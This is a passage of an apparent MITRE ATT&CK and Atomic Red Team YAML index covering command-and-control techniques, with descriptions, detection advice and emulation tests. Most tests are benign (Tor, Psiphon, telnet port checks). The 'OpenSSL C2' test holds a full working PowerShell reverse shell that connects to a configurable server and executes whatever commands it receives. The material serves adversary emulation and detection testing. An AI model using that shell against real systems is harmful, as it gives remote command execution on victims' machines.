      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      id: attack-pattern--8868cb5b-d575-4a60-acb2-07d37389a2fd
      type: attack-pattern
      created: '2020-07-01T18:23:25.002Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      external_references:
      - source_name: mitre-attack
        external_id: T1205.001
        url: https://attack.mitre.org/techniques/T1205/001
      - url: https://www.giac.org/paper/gcih/342/handle-cd00r-invisible-backdoor/103631
        description: 'Hartrell, Greg. (2002, August). Get a handle on cd00r: The invisible
          backdoor. Retrieved October 13, 2018.'
        source_name: Hartrell cd00r 2002
      modified: '2022-03-11T18:31:23.996Z'
      name: Port Knocking
      description: |-
        Adversaries may use port knocking to hide open ports used for persistence or command and control. To enable a port, an adversary sends a series of attempted connections to a predefined sequence of closed ports. After the sequence is completed, opening a port is often accomplished by the host based firewall, but could also be implemented by custom software.

        This technique has been observed both for the dynamic opening of a listening port as well as the initiating of a connection to a listening server on a different system.

        The observation of the signal packets to trigger the communication can be conducted through different methods. One means, originally implemented by Cd00r (Citation: Hartrell cd00r 2002), is to use the libpcap libraries to sniff for the packets in question. Another method leverages raw sockets, which enables the malware to use ports that are already open for use by other programs.
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: defense-evasion
      - kill_chain_name: mitre-attack
        phase_name: persistence
      - kill_chain_name: mitre-attack
        phase_name: command-and-control
      x_mitre_detection: Record network packets sent to and from the system, looking
        for extraneous packets that do not belong to established flows.
      x_mitre_is_subtechnique: true
      x_mitre_version: '1.1'
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_data_sources:
      - 'Network Traffic: Network Traffic Flow'
      - 'Network Traffic: Network Connection Creation'
      x_mitre_permissions_required:
      - User
    atomic_tests: []
  T1026:
    technique:
      x_mitre_platforms:
      - Linux
      - macOS
      - Windows
      x_mitre_domains:
      - enterprise-attack
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      id: attack-pattern--99709758-2b96-48f2-a68a-ad7fbd828091
      type: attack-pattern
      created: '2017-05-31T21:30:32.259Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      external_references:
      - source_name: mitre-attack
        external_id: T1026
        url: https://attack.mitre.org/techniques/T1026
      - url: https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf
        description: Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command
          & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.
        source_name: University of Birmingham C2
      modified: '2020-03-30T13:59:11.272Z'
      name: Multiband Communication
      description: |-
        **This technique has been deprecated and should no longer be used.**

        Some adversaries may split communications between different protocols. There could be one protocol for inbound command and control and another for outbound data, allowing it to bypass certain firewall restrictions. The split could also be random to simply avoid data threshold alerts on any one communication.
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: command-and-control
      x_mitre_detection: 'Analyze network data for uncommon data flows (e.g., a client
        sending significantly more data than it receives from a server). Processes
        utilizing the network that do not normally have network communication or have
        never been seen before are suspicious. Analyze packet contents to detect communications
        that do not follow the expected protocol behavior for the port that is being
        used. (Citation: University of Birmingham C2) Correlating alerts between multiple
        communication channels can further help identify command-and-control behavior.'
      x_mitre_deprecated: true
      x_mitre_version: '1.0'
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_is_subtechnique: false
    atomic_tests: []
  T1071.002:
    technique:
      x_mitre_platforms:
      - Linux
      - macOS
      - Windows
      x_mitre_domains:
      - enterprise-attack
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      id: attack-pattern--9a60a291-8960-4387-8a4a-2ab5c18bb50b
      type: attack-pattern
      created: '2020-03-15T16:16:25.763Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      external_references:
      - source_name: mitre-attack
        external_id: T1071.002
        url: https://attack.mitre.org/techniques/T1071/002
      - url: https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf
        description: Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command
          & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.
        source_name: University of Birmingham C2
      modified: '2020-08-21T14:41:22.911Z'
      name: File Transfer Protocols
      description: "Adversaries may communicate using application layer protocols
        associated with transferring files to avoid detection/network filtering by
        blending in with existing traffic. Commands to the remote system, and often
        the results of those commands, will be embedded within the protocol traffic
        between the client and server. \n\nProtocols such as FTP, FTPS, and TFTP that
        transfer files may be very common in environments.  Packets produced from
        these protocols may have many fields and headers in which data can be concealed.
        Data could also be concealed within the transferred files. An adversary may
        abuse these protocols to communicate with systems under their control within
        a victim network while also mimicking normal, expected traffic. "
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: command-and-control
      x_mitre_detection: 'Analyze network data for uncommon data flows (e.g., a client
        sending significantly more data than it receives from a server). Processes
        utilizing the network that do not normally have network communication or have
        never been seen before are suspicious. Analyze packet contents to detect application
        layer protocols that do not follow the expected protocol for the port that
        is being used.(Citation: University of Birmingham C2)'
      x_mitre_is_subtechnique: true
      x_mitre_version: '1.0'
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_data_sources:
      - 'Network Traffic: Network Traffic Flow'
      - 'Network Traffic: Network Traffic Content'
    atomic_tests: []
  T1102.003:
    technique:
      x_mitre_platforms:
      - Linux
      - macOS
      - Windows
      x_mitre_domains:
      - enterprise-attack
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      id: attack-pattern--9c99724c-a483-4d60-ad9d-7f004e42e8e8
      type: attack-pattern
      created: '2020-03-14T22:45:52.963Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      external_references:
      - source_name: mitre-attack
        external_id: T1102.003
        url: https://attack.mitre.org/techniques/T1102/003
      - url: https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf
        description: Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command
          & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.
        source_name: University of Birmingham C2
      modified: '2020-03-26T23:26:10.109Z'
      name: One-Way Communication
      description: |-
        Adversaries may use an existing, legitimate external Web service as a means for sending commands to a compromised system without receiving return output over the Web service channel. Compromised systems may leverage popular websites and social media to host command and control (C2) instructions. Those infected systems may opt to send the output from those commands back over a different C2 channel, including to another distinct Web service. Alternatively, compromised systems may return no output at all in cases where adversaries want to send instructions to systems and do not want a response.

        Popular websites and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection.
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: command-and-control
      x_mitre_detection: 'Host data that can relate unknown or suspicious process
        activity using a network connection is important to supplement any existing
        indicators of compromise based on malware command and control signatures and
        infrastructure or the presence of strong encryption. Packet capture analysis
        will require SSL/TLS inspection if data is encrypted. Analyze network data
        for uncommon data flows. User behavior monitoring may help to detect abnormal
        patterns of activity.(Citation: University of Birmingham C2)'
      x_mitre_is_subtechnique: true
      x_mitre_version: '1.0'
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_data_sources:
      - 'Network Traffic: Network Connection Creation'
      - 'Network Traffic: Network Traffic Flow'
      - 'Network Traffic: Network Traffic Content'
      x_mitre_permissions_required:
      - User
    atomic_tests: []
  T1090.003:
    technique:
      x_mitre_platforms:
      - Linux
      - macOS
      - Windows
      - Network
      x_mitre_domains:
      - enterprise-attack
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      id: attack-pattern--a782ebe2-daba-42c7-bc82-e8e9d923162d
      type: attack-pattern
      created: '2020-03-14T23:23:41.770Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      external_references:
      - source_name: mitre-attack
        external_id: T1090.003
        url: https://attack.mitre.org/techniques/T1090/003
      - source_name: Onion Routing
        url: https://en.wikipedia.org/wiki/Onion_routing
        description: Wikipedia. (n.d.). Onion Routing. Retrieved October 20, 2020.
      modified: '2020-10-21T17:54:28.280Z'
      name: 'Proxy: Multi-hop Proxy'
      description: |-
        To disguise the source of malicious traffic, adversaries may chain together multiple proxies. Typically, a defender will be able to identify the last proxy traffic traversed before it enters their network; the defender may or may not be able to identify any previous proxies before the last-hop proxy. This technique makes identifying the original source of the malicious traffic even more difficult by requiring the defender to trace malicious traffic through several proxies to identify its source. A particular variant of this behavior is to use onion routing networks, such as the publicly available TOR network. (Citation: Onion Routing)

        In the case of network infrastructure, particularly routers, it is possible for an adversary to leverage multiple compromised devices to create a multi-hop proxy chain within the Wide-Area Network (WAN) of the enterprise.  By leveraging [Patch System Image](https://attack.mitre.org/techniques/T1601/001), adversaries can add custom code to the affected network devices that will implement onion routing between those nodes.  This custom onion routing network will transport the encrypted C2 traffic through the compromised population, allowing adversaries to communicate with any device within the onion routing network.  This method is dependent upon the [Network Boundary Bridging](https://attack.mitre.org/techniques/T1599) method in order to allow the adversaries to cross the protected network boundary of the Internet perimeter and into the organizationâ€™s WAN. Protocols such as ICMP may be used as a transport.
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: command-and-control
      x_mitre_detection: |-
        When observing use of Multi-hop proxies, network data from the actual command and control servers could allow correlating incoming and outgoing flows to trace malicious traffic back to its source. Multi-hop proxies can also be detected by alerting on traffic to known anonymity networks (such as [Tor](https://attack.mitre.org/software/S0183)) or known adversary infrastructure that uses this technique.

        In context of network devices, monitor traffic for encrypted communications from the Internet that is addressed to border routers.  Compare this traffic with the configuration to determine whether it matches with any configured site-to-site Virtual Private Network (VPN) connections the device was intended to have. Monitor traffic for encrypted communications originating from potentially breached routers that is addressed to other routers within the organization.  Compare the source and destination with the configuration of the device to determine if these channels are an authorized Virtual Private Network (VPN) connections or other encrypted modes of communication. Monitor ICMP traffic from the Internet that is addressed to border routers and is encrypted.  Few if any legitimate use cases exist for sending encrypted data to a network device via ICMP.
      x_mitre_is_subtechnique: true
      x_mitre_version: '2.0'
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_data_sources:
      - 'Network Traffic: Network Traffic Flow'
      - 'Network Traffic: Network Traffic Content'
      - 'Network Traffic: Network Connection Creation'
      identifier: T1090.003
    atomic_tests:
    - name: Psiphon
      auto_generated_guid: 14d55ca0-920e-4b44-8425-37eedd72b173
      description: |
        Psiphon 3 is a circumvention tool from Psiphon Inc. that utilizes VPN, SSH and HTTP Proxy technology to provide you
        with uncensored access to Internet.
        This process will launch Psiphon 3 and establish a connection. Shortly after it will be shut down via process kill commands.
        More information can be found about Psiphon using the following urls
        http://s3.amazonaws.com/0ubz-2q11-gi9y/en.html
        https://psiphon.ca/faq.html
      supported_platforms:
      - windows
      dependency_executor_name: powershell
      dependencies:
      - description: 'The proxy settings backup file must exist on disk at $env:Temp\proxy-backup.txt

          '
        prereq_command: 'if (Test-Path $env:Temp\proxy-backup.txt) {exit 0} else {exit
          1}

          '
        get_prereq_command: |
          if(-not (test-path $env:Temp\proxy-backup.txt)){
          $Proxy = (Get-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings' -Name "ProxyServer" -ErrorAction Ignore).ProxyServer
          Set-Content $env:Temp\proxy-backup.txt $Proxy}
      - description: 'The Psiphon executable must exist in the Downloads folder

          '
        prereq_command: 'if (Test-Path $env:UserProfile\Downloads\psiphon3.exe) {exit
          0} else {exit 1}

          '
        get_prereq_command: 'Invoke-WebRequest -OutFile "$env:UserProfile\Downloads\psiphon3.exe"
          "https://s3.amazonaws.com/0ubz-2q11-gi9y/psiphon3.exe"

          '
      - description: "Batch file containing commands to run must be in src directory
          \n"
        prereq_command: 'if (Test-Path PathToAtomicsFolder\T1090.003\src\Psiphon.bat)
          {exit 0} else {exit 1}

          '
        get_prereq_command: 'Invoke-WebRequest -OutFile "PathToAtomicsFolder\T1090.003\src\Psiphon.bat"
          "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1090.003/src/Psiphon.bat"

          '
      executor:
        name: powershell
        command: 'PathToAtomicsFolder\T1090.003\src\Psiphon.bat

          '
        cleanup_command: "$Proxy = Get-Content $env:Temp\\proxy-backup.txt -ErrorAction
          Ignore\nif($null -ne $Proxy) \n{Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet
          Settings' -Name \"ProxyServer\" -Value $Proxy}\n"
    - name: Tor Proxy Usage - Windows
      auto_generated_guid: 7b9d85e5-c4ce-4434-8060-d3de83595e69
      description: "This test is designed to launch the tor proxy service, which is
        what is utilized in the background by the Tor Browser and other applications
        with add-ons in order to provide onion routing functionality.\nUpon successful
        execution, the tor proxy will be launched, run for 60 seconds, and then exit.
        \n"
      supported_platforms:
      - windows
      input_arguments:
        TorExe:
          description: Location of tor.exe file.
          type: string
          default: "$env:temp\\tor\\Tor\\tor.exe"
      dependency_executor_name: powershell
      dependencies:
      - description: "tor.exe must be installed on the machine \n"
        prereq_command: 'if (Test-Path #{TorExe}) {exit 0} else {exit 1}

          '
        get_prereq_command: |
          Start-BitsTransfer -Source "https://archive.torproject.org/tor-package-archive/torbrowser/11.0.6/tor-win32-0.4.6.9.zip" -Destination "$env:temp\tor.zip" -dynamic
          expand-archive -LiteralPath "$env:temp\tor.zip" -DestinationPath "$env:temp\tor"
      executor:
        command: |
          invoke-expression 'cmd /c start powershell -Command {cmd /c #{TorExe}}'
          sleep -s 60
          stop-process -name "tor" | out-null
        name: powershell
        elevation_required: false
    - name: Tor Proxy Usage - Debian/Ubuntu
      auto_generated_guid: 5ff9d047-6e9c-4357-b39b-5cf89d9b59c7
      description: "This test is designed to launch the tor proxy service, which is
        what is utilized in the background by the Tor Browser and other applications
        with add-ons in order to provide onion routing functionality.\nUpon successful
        execution, the tor proxy service will be launched. \n"
      supported_platforms:
      - linux
      dependency_executor_name: sh
      dependencies:
      - description: "Tor must be installed on the machine \n"
        prereq_command: 'if [ -x "$(command -v tor --version)" ]; then exit 0; else
          exit 1; fi

          '
        get_prereq_command: 'sudo apt-get -y install tor

          '
      executor:
        command: "sudo systemctl start tor \n"
        cleanup_command: 'sudo systemctl stop tor

          '
        name: sh
    - name: Tor Proxy Usage - MacOS
      auto_generated_guid: 12631354-fdbc-4164-92be-402527e748da
      description: "This test is designed to launch the tor proxy service, which is
        what is utilized in the background by the Tor Browser and other applications
        with add-ons in order to provide onion routing functionality.\nUpon successful
        execution, the tor proxy service will be launched. \n"
      supported_platforms:
      - macos
      dependency_executor_name: sh
      dependencies:
      - description: "Tor must be installed on the machine \n"
        prereq_command: 'if [ -x "$(command -v tor --version)" ]; then exit 0; else
          exit 1; fi

          '
        get_prereq_command: |
          if [ ! -x "$(command -v brew --version)" ]; then /bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh keystroke return)"; fi
          brew install tor
      executor:
        command: 'osascript -e ''tell application "Terminal" to do script "tor"''

          '
        cleanup_command: 'killall tor > /dev/null 2>&1

          '
        name: sh
  T1001:
    technique:
      x_mitre_platforms:
      - Linux
      - macOS
      - Windows
      x_mitre_domains:
      - enterprise-attack
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      id: attack-pattern--ad255bfe-a9e6-4b52-a258-8d3462abe842
      type: attack-pattern
      created: '2017-05-31T21:30:18.931Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      external_references:
      - source_name: mitre-attack
        external_id: T1001
        url: https://attack.mitre.org/techniques/T1001
      - url: https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf
        description: Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command
          & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.
        source_name: University of Birmingham C2
      modified: '2020-03-15T00:40:27.670Z'
      name: Data Obfuscation
      description: 'Adversaries may obfuscate command and control traffic to make
        it more difficult to detect. Command and control (C2) communications are hidden
        (but not necessarily encrypted) in an attempt to make the content more difficult
        to discover or decipher and to make the communication less conspicuous and
        hide commands from being seen. This encompasses many methods, such as adding
        junk data to protocol traffic, using steganography, or impersonating legitimate
        protocols. '
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: command-and-control
      x_mitre_detection: 'Analyze network data for uncommon data flows (e.g., a client
        sending significantly more data than it receives from a server). Processes
        utilizing the network that do not normally have network communication or have
        never been seen before are suspicious. Analyze packet contents to detect communications
        that do not follow the expected protocol behavior for the port that is being
        used. (Citation: University of Birmingham C2)'
      x_mitre_version: '1.1'
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_data_sources:
      - 'Network Traffic: Network Traffic Content'
      x_mitre_is_subtechnique: false
    atomic_tests: []
  T1571:
    technique:
      modified: '2023-02-28T22:28:35.202Z'
      name: Non-Standard Port
      description: |-
        Adversaries may communicate using a protocol and port pairing that are typically not associated. For example, HTTPS over port 8088(Citation: Symantec Elfin Mar 2019) or port 587(Citation: Fortinet Agent Tesla April 2018) as opposed to the traditional port 443. Adversaries may make changes to the standard port used by a protocol to bypass filtering or muddle analysis/parsing of network data.

        Adversaries may also make changes to victim systems to abuse non-standard ports. For example, Registry keys and other configuration settings can be used to modify protocol and port pairings.(Citation: change_rdp_port_conti)
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: command-and-control
      x_mitre_detection: 'Analyze packet contents to detect communications that do
        not follow the expected protocol behavior for the port that is being used.
        Analyze network data for uncommon data flows (e.g., a client sending significantly
        more data than it receives from a server). Processes utilizing the network
        that do not normally have network communication or have never been seen before
        are suspicious.(Citation: University of Birmingham C2)'
      x_mitre_platforms:
      - Linux
      - macOS
      - Windows
      x_mitre_is_subtechnique: false
      x_mitre_deprecated: false
      x_mitre_domains:
      - enterprise-attack
      x_mitre_version: '1.1'
      x_mitre_data_sources:
      - 'Network Traffic: Network Traffic Content'
      - 'Network Traffic: Network Traffic Flow'
      type: attack-pattern
      id: attack-pattern--b18eae87-b469-4e14-b454-b171b416bc18
      created: '2020-03-14T18:18:32.443Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      revoked: false
      external_references:
      - source_name: mitre-attack
        url: https://attack.mitre.org/techniques/T1571
        external_id: T1571
      - source_name: University of Birmingham C2
        description: Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command
          & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.
        url: https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf
      - source_name: Symantec Elfin Mar 2019
        description: 'Security Response attack Investigation Team. (2019, March 27).
          Elfin: Relentless Espionage Group Targets Multiple Organizations in Saudi
          Arabia and U.S.. Retrieved April 10, 2019.'
        url: https://www.symantec.com/blogs/threat-intelligence/elfin-apt33-espionage
      - source_name: change_rdp_port_conti
        description: 'The DFIR Report. (2022, March 1). "Change RDP port" #ContiLeaks.
          Retrieved March 1, 2022.'
        url: https://twitter.com/TheDFIRReport/status/1498657772254240768
      - source_name: Fortinet Agent Tesla April 2018
        description: Zhang, X. (2018, April 05). Analysis of New Agent Tesla Spyware
          Variant. Retrieved November 5, 2018.
        url: https://www.fortinet.com/blog/threat-research/analysis-of-new-agent-tesla-spyware-variant.html
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      x_mitre_attack_spec_version: 3.1.0
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      identifier: T1571
    atomic_tests:
    - name: Testing usage of uncommonly used port with PowerShell
      auto_generated_guid: 21fe622f-8e53-4b31-ba83-6d333c2583f4
      description: |
        Testing uncommonly used port utilizing PowerShell. APT33 has been known to attempt telnet over port 8081. Upon execution, details about the successful
        port check will be displayed.
      supported_platforms:
      - windows
      input_arguments:
        port:
          description: Specify uncommon port number
          type: string
          default: '8081'
        domain:
          description: Specify target hostname
          type: string
          default: google.com
      executor:
        command: 'Test-NetConnection -ComputerName #{domain} -port #{port}

          '
        name: powershell
    - name: Testing usage of uncommonly used port
      auto_generated_guid: 5db21e1d-dd9c-4a50-b885-b1e748912767
      description: 'Testing uncommonly used port utilizing telnet.

        '
      supported_platforms:
      - linux
      - macos
      input_arguments:
        port:
          description: Specify uncommon port number
          type: string
          default: '8081'
        domain:
          description: Specify target hostname
          type: string
          default: google.com
      dependency_executor_name: sh
      dependencies:
      - description: 'Requires telnet

          '
        prereq_command: 'which telnet

          '
        get_prereq_command: 'echo "please install telnet to run this test"; exit 1

          '
      executor:
        command: |
          echo quit | telnet #{domain} #{port}
          exit 0
        name: sh
  T1573:
    technique:
      x_mitre_platforms:
      - Linux
      - macOS
      - Windows
      x_mitre_domains:
      - enterprise-attack
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      id: attack-pattern--b8902400-e6c5-4ba2-95aa-2d35b442b118
      type: attack-pattern
      created: '2020-03-16T15:33:01.739Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      external_references:
      - source_name: mitre-attack
        external_id: T1573
        url: https://attack.mitre.org/techniques/T1573
      - url: http://www.sans.org/reading-room/whitepapers/analyst/finding-hidden-threats-decrypting-ssl-34840
        description: Butler, M. (2013, November). Finding Hidden Threats by Decrypting
          SSL. Retrieved April 5, 2016.
        source_name: SANS Decrypting SSL
      - url: https://insights.sei.cmu.edu/cert/2015/03/the-risks-of-ssl-inspection.html
        description: Dormann, W. (2015, March 13). The Risks of SSL Inspection. Retrieved
          April 5, 2016.
        source_name: SEI SSL Inspection Risks
      - url: https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf
        description: Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command
          & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.
        source_name: University of Birmingham C2
      modified: '2021-04-20T19:27:46.650Z'
      name: Encrypted Channel
      description: Adversaries may employ a known encryption algorithm to conceal
        command and control traffic rather than relying on any inherent protections
        provided by a communication protocol. Despite the use of a secure algorithm,
        these implementations may be vulnerable to reverse engineering if secret keys
        are encoded and/or generated within malware samples/configuration files.
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: command-and-control
      x_mitre_detection: |-
        SSL/TLS inspection is one way of detecting command and control traffic within some encrypted communication channels.(Citation: SANS Decrypting SSL) SSL/TLS inspection does come with certain risks that should be considered before implementing to avoid potential security issues such as incomplete certificate validation.(Citation: SEI SSL Inspection Risks)

        In general, analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.(Citation: University of Birmingham C2)
      x_mitre_version: '1.0'
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_data_sources:
      - 'Network Traffic: Network Traffic Content'
      x_mitre_is_subtechnique: false
      identifier: T1573
    atomic_tests:
    - name: OpenSSL C2
      auto_generated_guid: 21caf58e-87ad-440c-a6b8-3ac259964003
      description: |
        Thanks to @OrOneEqualsOne for this quick C2 method.
        This is to test to see if a C2 session can be established using an SSL socket.
        More information about this technique, including how to set up the listener, can be found here:
        https://medium.com/walmartlabs/openssl-server-reverse-shell-from-windows-client-aee2dbfa0926

        Upon successful execution, powershell will make a network connection to 127.0.0.1 over 443.
      supported_platforms:
      - windows
      input_arguments:
        server_ip:
          description: IP of the external server
          type: string
          default: 127.0.0.1
        server_port:
          description: The port to connect to on the external server
          type: string
          default: '443'
      executor:
        command: |
          $server_ip = #{server_ip}
          $server_port = #{server_port}
          $socket = New-Object Net.Sockets.TcpClient('#{server_ip}', '#{server_port}')
          $stream = $socket.GetStream()
          $sslStream = New-Object System.Net.Security.SslStream($stream,$false,({$True} -as [Net.Security.RemoteCertificateValidationCallback]))
          $sslStream.AuthenticateAsClient('fakedomain.example', $null, "Tls12", $false)
          $writer = new-object System.IO.StreamWriter($sslStream)
          $writer.Write('PS ' + (pwd).Path + '> ')
          $writer.flush()
          [byte[]]$bytes = 0..65535|%{0};
          while(($i = $sslStream.Read($bytes, 0, $bytes.Length)) -ne 0)
          {$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
          $sendback = (iex $data | Out-String ) 2>&1;
          $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
          $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
          $sslStream.Write($sendbyte,0,$sendbyte.Length);$sslStream.Flush()}
        name: powershell
  T1102.002:
    technique:
      x_mitre_platforms:
      - Linux
      - macOS
      - Windows
      x_mitre_domains:
      - enterprise-attack
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      id: attack-pattern--be055942-6e63-49d7-9fa1-9cb7d8a8f3f4
      type: attack-pattern
      created: '2020-03-14T22:34:03.024Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      external_references:
      - source_name: mitre-attack
        external_id: T1102.002
        url: https://attack.mitre.org/techniques/T1102/002
      - url: https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf
        description: Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command
          & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.
        source_name: University of Birmingham C2
      modified: '2020-03-26T23:15:47.861Z'
      name: Bidirectional Communication
      description: "Adversaries may use an existing, legitimate external Web service
        as a means for sending commands to and receiving output from a compromised
        system over the Web service channel. Compromised systems may leverage popular
        websites and social media to host command and control (C2) instructions. Those
        infected systems can then send the output from those commands back over that
        Web service channel. The return traffic may occur in a variety of ways, depending
        on the Web service being utilized. For example, the return traffic may take
        the form of the compromised system posting a comment on a forum, issuing a
        pull request to development project, updating a document hosted on a Web service,
        or by sending a Tweet. \n\nPopular websites and social media acting as a mechanism
        for C2 may give a significant amount of cover due to the likelihood that hosts
        within a network are already communicating with them prior to a compromise.
        Using common services, such as those offered by Google or Twitter, makes it
        easier for adversaries to hide in expected noise. Web service providers commonly
        use SSL/TLS encryption, giving adversaries an added level of protection. "
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: command-and-control
      x_mitre_detection: 'Host data that can relate unknown or suspicious process
        activity using a network connection is important to supplement any existing
        indicators of compromise based on malware command and control signatures and
        infrastructure or the presence of strong encryption. Packet capture analysis
        will require SSL/TLS inspection if data is encrypted. Analyze network data
        for uncommon data flows (e.g., a client sending significantly more data than
        it receives from a server). User behavior monitoring may help to detect abnormal
        patterns of activity.(Citation: University of Birmingham C2)'
      x_mitre_is_subtechnique: true
      x_mitre_version: '1.0'
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_data_sources:
      - 'Network Traffic: Network Traffic Flow'
      - 'Network Traffic: Network Traffic Content'
      - 'Network Traffic: Network Connection Creation'
      x_mitre_permissions_required:
      - User
    atomic_tests: []
  T1573.002:
    technique:
      x_mitre_platforms:
      - Linux
      - macOS
      - Windows
      x_mitre_domains:
      - enterprise-attack
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      id: attack-pattern--bf176076-b789-408e-8cba-7275e81c0ada
      type: attack-pattern
      created: '2020-03-16T15:48:33.882Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      external_references:
      - source_name: mitre-attack
        external_id: T1573.002
        url: https://attack.mitre.org/techniques/T1573/002
      - url: http://www.sans.org/reading-room/whitepapers/analyst/finding-hidden-threats-decrypting-ssl-34840
        description: Butler, M. (2013, November). Finding Hidden Threats by Decrypting
          SSL. Retrieved April 5, 2016.
        source_name: SANS Decrypting SSL
      - url: https://insights.sei.cmu.edu/cert/2015/03/the-risks-of-ssl-inspection.html
        description: Dormann, W. (2015, March 13). The Risks of SSL Inspection. Retrieved
          April 5, 2016.
        source_name: SEI SSL Inspection Risks
      - url: https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf
        description: Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command
          & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.
        source_name: University of Birmingham C2
      modified: '2021-04-20T19:27:46.484Z'
      name: Asymmetric Cryptography
      description: |-
        Adversaries may employ a known asymmetric encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Asymmetric cryptography, also known as public key cryptography, uses a keypair per party: one public that can be freely distributed, and one private. Due to how the keys are generated, the sender encrypts data with the receiverâ€™s public key and the receiver decrypts the data with their private key. This ensures that only the intended recipient can read the encrypted data. Common public key encryption algorithms include RSA and ElGamal.

        For efficiency, many protocols (including SSL/TLS) use symmetric cryptography once a connection is established, but use asymmetric cryptography to establish or transmit a key. As such, these protocols are classified as [Asymmetric Cryptography](https://attack.mitre.org/techniques/T1573/002).
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: command-and-control
      x_mitre_detection: |-
        SSL/TLS inspection is one way of detecting command and control traffic within some encrypted communication channels.(Citation: SANS Decrypting SSL) SSL/TLS inspection does come with certain risks that should be considered before implementing to avoid potential security issues such as incomplete certificate validation.(Citation: SEI SSL Inspection Risks)

